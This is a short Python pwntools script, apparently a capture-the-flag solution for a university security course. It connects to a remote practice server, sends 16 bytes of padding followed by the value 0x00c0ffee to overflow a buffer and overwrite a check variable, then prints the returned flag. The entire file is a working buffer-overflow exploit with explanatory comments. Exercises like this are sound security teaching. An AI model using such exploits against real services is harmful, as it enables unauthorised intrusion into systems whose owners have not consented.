from pwn import *
# Import pwntools library

io = remote('inf226.puffling.no', 7000)
# Open connection to the server

io.send(cyclic(16) + p32(0x00c0ffee)) 
# Send 16 random bytes to fill the buffer, then a 32bit integer with a value of 0x00c0ffee

io.shutdown('out')
# Stop sending output (input to the program)

print(io.readall())
# Read the output from server (flag)

